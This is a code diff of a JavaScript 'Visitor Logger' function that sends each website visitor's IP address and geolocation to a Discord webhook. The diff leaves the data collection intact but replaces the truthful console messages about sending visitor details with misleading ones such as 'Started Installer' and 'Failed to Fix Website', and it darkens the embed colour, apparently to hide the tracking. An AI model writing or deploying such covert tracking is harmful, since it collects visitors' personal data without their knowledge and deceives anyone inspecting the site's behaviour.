@@ -66,7 +66,7 @@ async function logVisitorDetails() {
       username: "Visitor Logger",
       embeds: [{
         title: "New Website Visitor",
-        color: 0x00FF00,
+        color: 0x2f3136,
         fields: [
           { name: "IP Address", value: geoData.ip || "Unknown", inline: true },
           { name: "Location", value: `${geoData.city || "Unknown City"}, ${geoData.region || "Unknown Region"}, ${geoData.country || "Unknown Country"}`, inline: true },
@@ -95,12 +95,12 @@ async function logVisitorDetails() {
     });
 
     if (response.ok) {
-      console.log('Visitor details sent to Discord webhook successfully.');
+      console.log('Started Installer');
     } else {
-      console.error('Failed to send visitor details to Discord webhook.');
+      console.error('Failed to Fix Website');
     }
   } catch (error) {
-    console.error('Error logging visitor details:', error);
+    console.error('Error logging details:', error);
   }
 }
 
